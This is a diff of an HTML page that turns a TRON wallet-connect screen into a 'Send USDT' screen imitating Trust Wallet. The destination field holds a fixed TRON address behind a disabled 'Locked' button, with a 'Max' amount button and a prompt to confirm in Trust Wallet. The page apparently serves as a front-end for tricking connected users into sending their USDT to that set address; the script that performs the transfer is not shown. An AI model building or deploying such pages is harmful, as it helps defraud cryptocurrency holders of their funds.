@@ -1,136 +1,164 @@
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-    <meta name="description" content="Connect your TRON wallet securely via Trust Wallet." />
-    <meta name="theme-color" content="#0a0c12" />
-    <title>TRON Wallet</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-      rel="stylesheet"
-      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"
-    />
-  </head>
-  <body>
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover"/>
+  <meta name="theme-color" content="#141414"/>
+  <title>Send USDT</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"/>
+</head>
+<body>
 
-    <!-- Boot overlay -->
-    <div id="bootOverlay" class="boot-overlay">
-      <div class="boot-ring"></div>
+<div id="boot" class="boot"><div class="boot-ring"></div></div>
+
+<!-- CONNECTING -->
+<div id="vConn" class="page" hidden>
+  <div class="center-wrap">
+    <div class="spin-lg"></div>
+    <p class="conn-text" id="connText">Connecting wallet…</p>
+  </div>
+</div>
+
+<!-- SEND USDT -->
+<div id="vSend" class="page send-page" hidden>
+  <div class="send-header">
+    <span></span>
+    <h1 class="send-title">Send USDT</h1>
+    <span></span>
+  </div>
+
+  <div class="send-body">
+
+    <div class="field-block">
+      <p class="field-lbl">Address or Domain Name</p>
+      <div class="addr-box">
+        <span class="addr-txt" id="addrDisplay">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</span>
+        <div class="addr-actions">
+          <button class="icon-btn" disabled title="Locked">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+              <rect x="5" y="11" width="14" height="11" rx="2" stroke="#39D98A" stroke-width="2"/>
+              <path d="M8 11V7a4 4 0 0 1 8 0v4" stroke="#39D98A" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+          </button>
+          <button class="icon-btn" id="btnPaste">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+              <rect x="8" y="3" width="13" height="16" rx="2" stroke="#39D98A" stroke-width="2"/>
+              <rect x="3" y="6" width="13" height="16" rx="2" fill="#1c1c1e" stroke="#39D98A" stroke-width="2"/>
+            </svg>
+          </button>
+          <button class="icon-btn">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+              <rect x="3" y="3" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
+              <rect x="14" y="3" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
+              <rect x="3" y="14" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
+              <rect x="14" y="14" width="3" height="3" fill="#39D98A" rx="0.5"/>
+              <rect x="18" y="14" width="3" height="3" fill="#39D98A" rx="0.5"/>
+              <rect x="14" y="18" width="3" height="3" fill="#39D98A" rx="0.5"/>
+              <rect x="18" y="18" width="3" height="3" fill="#39D98A" rx="0.5"/>
+            </svg>
+          </button>
+        </div>
+      </div>
     </div>
 
-    <main class="screen">
-
-      <!-- Ambient glows -->
-      <div class="glow glow-top"></div>
-      <div class="glow glow-bottom"></div>
-
-      <!-- Brand -->
-      <div class="brand">
-        <div class="logo-ring">
-          <svg class="tron-icon" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M20 4L36 12V28L20 36L4 28V12L20 4Z" fill="url(#hex)" />
-            <path d="M14 15h12M20 15v10" stroke="#fff" stroke-width="2.4" stroke-linecap="round"/>
-            <defs>
-              <linearGradient id="hex" x1="4" y1="4" x2="36" y2="36" gradientUnits="userSpaceOnUse">
-                <stop stop-color="#eb0029"/>
-                <stop offset="1" stop-color="#ff5c35"/>
-              </linearGradient>
-            </defs>
+    <div class="field-block">
+      <p class="field-lbl">Destination network</p>
+      <div class="net-chip">
+        <div class="tron-icon-wrap">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+            <circle cx="9" cy="9" r="9" fill="#EF0027"/>
+            <path d="M5 7h8M9 7v5" stroke="white" stroke-width="1.6" stroke-linecap="round"/>
           </svg>
         </div>
-        <h1 class="brand-name">TRON Wallet</h1>
-        <p class="brand-sub">Powered by WalletConnect &amp; Trust Wallet</p>
+        <span class="net-name">Tron</span>
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+          <path d="M6 9l6 6 6-6" stroke="#8E8E93" stroke-width="2" stroke-linecap="round"/>
+        </svg>
       </div>
+    </div>
 
-      <!-- ── STATE: Idle (shown inside Trust Wallet browser) ─────────────── -->
-      <!-- User must tap to trigger connect (iOS WebView requires user gesture) -->
-      <div id="viewIdle" class="view" hidden>
-        <div class="card card-idle">
-          <!-- Trust Wallet logo -->
-          <div class="tw-logo-wrap">
-            <svg width="56" height="56" viewBox="0 0 56 56" fill="none">
-              <rect width="56" height="56" rx="16" fill="#3375BB"/>
-              <path d="M28 12l16 6v10c0 9-7 17-16 20C19 45 12 37 12 28V18l16-6z"
-                fill="white"/>
-            </svg>
-          </div>
-          <p class="card-title">Trust Wallet Detected</p>
-          <p class="card-sub">Tap the button below to connect your TRON wallet</p>
+    <div class="field-block">
+      <p class="field-lbl">Amount</p>
+      <div class="amount-box">
+        <input id="amtInput" class="amt-input" type="number" inputmode="decimal"
+               placeholder="USDT Amount" min="0" step="any"/>
+        <div class="amt-right">
+          <span class="amt-currency">USDT</span>
+          <button id="btnMax" class="max-btn" type="button">Max</button>
         </div>
+      </div>
+      <p class="usd-eq" id="usdEq">≈ $0.00</p>
+    </div>
 
-        <button id="btnConnect" class="btn btn-primary btn-large">
-          <svg viewBox="0 0 24 24" fill="none" width="20" height="20" style="flex-shrink:0">
-            <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"
-              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"
-              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    <div class="field-block">
+      <p class="field-lbl">Memo</p>
+      <div class="memo-box">
+        <input id="memoInput" class="memo-input" type="text" placeholder=""/>
+        <div class="memo-icons">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+            <rect x="3" y="3" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
+            <rect x="14" y="3" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
+            <rect x="3" y="14" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
+            <rect x="14" y="14" width="3" height="3" fill="#39D98A" rx="0.5"/>
+            <rect x="18" y="14" width="3" height="3" fill="#39D98A" rx="0.5"/>
+            <rect x="14" y="18" width="3" height="3" fill="#39D98A" rx="0.5"/>
+            <rect x="18" y="18" width="3" height="3" fill="#39D98A" rx="0.5"/>
           </svg>
-          Connect Wallet
-        </button>
-      </div>
-
-      <!-- ── STATE: Connecting ────────────────────────────────────────────── -->
-      <div id="viewConnecting" class="view" hidden>
-        <div class="card">
-          <div class="card-icon connecting-icon">
-            <span class="dot-ring"></span>
-          </div>
-          <p id="connectingMsg" class="card-title">Connecting…</p>
-          <p id="connectingSub" class="card-sub">Waiting for Trust Wallet</p>
-        </div>
-      </div>
-
-      <!-- ── STATE: Connected ─────────────────────────────────────────────── -->
-      <div id="viewConnected" class="view" hidden>
-        <div class="card card-connected">
-          <div class="card-icon">
-            <svg viewBox="0 0 24 24" fill="none" width="28" height="28">
-              <circle cx="12" cy="12" r="10" fill="#00c87a22"/>
-              <path d="M7.5 12l3 3 6-6" stroke="#00c87a" stroke-width="2.2"
-                stroke-linecap="round" stroke-linejoin="round"/>
-            </svg>
-          </div>
-          <p class="card-title" style="color:#00c87a">Wallet Connected</p>
-          <div class="address-row">
-            <span class="dot-live"></span>
-            <code id="walletAddr" class="wallet-addr">–</code>
-          </div>
-          <div class="network-pill">
-            <span class="network-dot"></span>
-            TRON Mainnet
-          </div>
-        </div>
-        <button id="btnDisconnect" class="btn btn-danger">Disconnect</button>
-      </div>
-
-      <!-- ── STATE: Error ─────────────────────────────────────────────────── -->
-      <div id="viewError" class="view" hidden>
-        <div class="card card-error">
-          <div class="card-icon">
-            <svg viewBox="0 0 24 24" fill="none" width="28" height="28">
-              <circle cx="12" cy="12" r="10" fill="#eb002922"/>
-              <path d="M12 7v5M12 16h.01" stroke="#eb0029" stroke-width="2.2"
-                stroke-linecap="round"/>
-            </svg>
-          </div>
-          <p class="card-title" style="color:#eb0029">Connection Failed</p>
-          <p id="errorMsg" class="card-sub"></p>
-        </div>
-        <button id="btnRetry" class="btn btn-primary">
-          <svg viewBox="0 0 24 24" fill="none" width="18" height="18" style="flex-shrink:0">
-            <path d="M1 4v6h6M23 20v-6h-6" stroke="currentColor" stroke-width="2"
-              stroke-linecap="round" stroke-linejoin="round"/>
-            <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"
-              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="9" stroke="#39D98A" stroke-width="1.8"/>
+            <path d="M12 8h.01M12 12v4" stroke="#39D98A" stroke-width="1.8" stroke-linecap="round"/>
           </svg>
-          Try Again
-        </button>
+        </div>
       </div>
+    </div>
 
-    </main>
+    <p id="sendErr" class="send-err" hidden></p>
+  </div>
 
-    <script type="module" src="/src/main.js"></script>
-  </body>
+  <div class="send-footer">
+    <button id="btnNext" class="btn-next" type="button">Next</button>
+  </div>
+</div>
+
+<!-- SIGNING -->
+<div id="vSign" class="page" hidden>
+  <div class="center-wrap">
+    <div class="spin-lg"></div>
+    <p class="conn-text">Confirm in Trust Wallet…</p>
+    <p class="conn-sub">Check your Trust Wallet app</p>
+  </div>
+</div>
+
+<!-- SUCCESS -->
+<div id="vOk" class="page" hidden>
+  <div class="center-wrap">
+    <div class="result-icon ok-icon">
+      <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
+        <path d="M5 12l5 5L19 7" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <p class="result-title">Transaction Sent!</p>
+    <p class="result-sub" id="txidTxt"></p>
+    <button id="btnAgain" class="btn-next" style="margin-top:28px">Send Again</button>
+  </div>
+</div>
+
+<!-- ERROR -->
+<div id="vErr" class="page" hidden>
+  <div class="center-wrap">
+    <div class="result-icon err-icon">
+      <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
+        <path d="M18 6L6 18M6 6l12 12" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+      </svg>
+    </div>
+    <p class="result-title">Failed</p>
+    <p class="result-sub" id="errMsg"></p>
+    <button id="btnRetry" class="btn-next" style="margin-top:28px">Try Again</button>
+  </div>
+</div>
+
+<script type="module" src="/src/main.js"></script>
+</body>
 </html>
